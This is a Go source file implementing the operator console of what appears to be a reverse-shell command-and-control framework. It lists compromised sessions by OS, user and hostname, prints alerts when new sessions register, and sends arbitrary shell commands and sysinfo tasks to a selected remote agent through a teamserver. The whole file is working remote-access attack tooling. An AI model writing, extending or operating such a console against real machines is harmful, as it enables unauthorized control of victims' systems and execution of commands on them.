package console

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"reverseshell/internal/api"
	"reverseshell/internal/protocol"
)

// pollInterval and resultWait bound how long exec waits for a task result.
const (
	pollInterval = 200 * time.Millisecond
	resultWait   = 10 * time.Second
)

// REPL is the operator's interactive console.
type REPL struct {
	client   *Client
	in       *bufio.Scanner
	out      io.Writer
	selected string
}

// NewREPL returns a REPL reading from stdin and writing to stdout.
func NewREPL(c *Client) *REPL {
	return &REPL{client: c, in: bufio.NewScanner(os.Stdin), out: os.Stdout}
}

// Run reads commands until quit/EOF or ctx cancellation. Session events from
// the SSE stream are printed as they arrive.
func (r *REPL) Run(ctx context.Context) error {
	ectx, cancel := context.WithCancel(ctx)
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		_ = r.client.Events(ectx, r.onEvent)
	}()
	defer func() {
		cancel()
		wg.Wait()
	}()

	fmt.Fprintln(r.out, "rs console — 'help' for commands, 'quit' to exit")
	for {
		if r.selected == "" {
			fmt.Fprint(r.out, "rs> ")
		} else {
			fmt.Fprintf(r.out, "rs[%s]> ", r.selected)
		}
		if !r.in.Scan() {
			return nil
		}
		line := strings.TrimSpace(r.in.Text())
		if line == "" {
			continue
		}
		cmd, rest := splitCommand(line)
		var err error
		switch cmd {
		case "help":
			r.printHelp()
		case "sessions":
			err = r.cmdSessions(ctx)
		case "use":
			err = r.cmdUse(ctx, rest)
		case "exec":
			err = r.cmdExec(ctx, rest, protocol.KindShell)
		case "sysinfo":
			err = r.cmdExec(ctx, "", protocol.KindSysinfo)
		case "back":
			r.selected = ""
		case "shutdown":
			return r.cmdShutdown(ctx)
		case "quit", "exit":
			return nil
		default:
			fmt.Fprintf(r.out, "unknown command %q — try 'help'\n", cmd)
		}
		if err != nil {
			fmt.Fprintf(r.out, "error: %v\n", err)
		}
		if ctx.Err() != nil {
			return nil
		}
	}
}

func splitCommand(line string) (string, string) {
	if i := strings.IndexByte(line, ' '); i >= 0 {
		return line[:i], strings.TrimSpace(line[i+1:])
	}
	return line, ""
}

func (r *REPL) printHelp() {
	fmt.Fprintln(r.out, "  sessions         list live sessions")
	fmt.Fprintln(r.out, "  use <n|sid>      select a session by list number or sid")
	fmt.Fprintln(r.out, "  exec <cmd...>    run a shell command on the selected session")
	fmt.Fprintln(r.out, "  sysinfo          agent snapshot of the selected session")
	fmt.Fprintln(r.out, "  back             deselect the session")
	fmt.Fprintln(r.out, "  shutdown         stop the teamserver and exit")
	fmt.Fprintln(r.out, "  quit             exit the console")
}

func (r *REPL) onEvent(evType string, data []byte) {
	switch evType {
	case "session.register":
		var m struct {
			SID      string `json:"sid"`
			OS       string `json:"os"`
			User     string `json:"user"`
			Hostname string `json:"hostname"`
		}
		if json.Unmarshal(data, &m) == nil {
			fmt.Fprintf(r.out, "\r[new session %s — %s\\%s (%s)]\n", m.SID, m.OS, m.User, m.Hostname)
		}
	case "session.down":
		var m struct {
			SID string `json:"sid"`
		}
		if json.Unmarshal(data, &m) == nil {
			fmt.Fprintf(r.out, "\r[session %s went down]\n", m.SID)
		}
	}
}

func (r *REPL) cmdSessions(ctx context.Context) error {
	list, err := r.client.Sessions(ctx)
	if err != nil {
		return err
	}
	if len(list) == 0 {
		fmt.Fprintln(r.out, "  no live sessions")
		return nil
	}
	fmt.Fprintf(r.out, " #  %-14s %-22s %-18s %s\n", "sid", "peer", "os", "last_seen")
	for i, s := range list {
		fmt.Fprintf(r.out, "%2d  %-14s %-22s %-18s %s\n",
			i+1, s.SID, s.Peer, s.OS+"/"+s.Arch, ago(time.Since(s.LastSeen)))
	}
	return nil
}

func ago(d time.Duration) string {
	switch {
	case d < 5*time.Second:
		return "just now"
	case d < time.Minute:
		return fmt.Sprintf("%ds ago", int(d.Seconds()))
	default:
		return fmt.Sprintf("%dm ago", int(d.Minutes()))
	}
}

func (r *REPL) cmdUse(ctx context.Context, rest string) error {
	if rest == "" {
		return fmt.Errorf("usage: use <number|sid>")
	}
	list, err := r.client.Sessions(ctx)
	if err != nil {
		return err
	}
	if n, err := strconv.Atoi(rest); err == nil {
		if n < 1 || n > len(list) {
			return fmt.Errorf("no session #%d", n)
		}
		r.selected = list[n-1].SID
		return nil
	}
	for _, s := range list {
		if s.SID == rest {
			r.selected = s.SID
			return nil
		}
	}
	return fmt.Errorf("no session %q", rest)
}

func (r *REPL) cmdExec(ctx context.Context, cmd string, kind string) error {
	if r.selected == "" {
		return fmt.Errorf("no session selected — use 'use <n|sid>' first")
	}
	spec := protocol.TaskSpec{Kind: kind, Timeout: 60}
	if kind == protocol.KindShell {
		if cmd == "" {
			return fmt.Errorf("usage: exec <command>")
		}
		args, err := json.Marshal(protocol.ShellArgs{Cmd: cmd})
		if err != nil {
			return err
		}
		spec.Args = args
	}
	tid, err := r.client.CreateTask(ctx, r.selected, spec)
	if err != nil {
		return err
	}
	deadline := time.Now().Add(time.Duration(spec.Timeout)*time.Second + resultWait)
	for {
		view, err := r.client.Task(ctx, tid)
		if err != nil {
			return err
		}
		if view.Status == "done" {
			printResult(r.out, view)
			return nil
		}
		if time.Now().After(deadline) {
			return fmt.Errorf("task %s did not finish in time", tid)
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(pollInterval):
		}
	}
}

func printResult(out io.Writer, view api.TaskView) {
	var ms int64
	if view.Result != nil {
		ms = view.Result.DurationMS
	}
	fmt.Fprintf(out, "[%s] %s (%d ms)\n", view.TID, view.Kind, ms)
	if view.Result == nil {
		return
	}
	fmt.Fprintf(out, "  status: %s exit=%d\n", view.Result.Status, view.Result.ExitCode)
	if view.Result.Stdout != "" {
		fmt.Fprintln(out, strings.TrimRight(view.Result.Stdout, "\r\n"))
	}
	if view.Result.Stderr != "" {
		fmt.Fprintln(out, "stderr: "+strings.TrimRight(view.Result.Stderr, "\r\n"))
	}
	if view.Result.Detail != "" {
		fmt.Fprintln(out, "detail: "+view.Result.Detail)
	}
}

func (r *REPL) cmdShutdown(ctx context.Context) error {
	if err := r.client.Shutdown(ctx); err != nil {
		return err
	}
	fmt.Fprintln(r.out, "teamserver shutting down")
	return nil
}
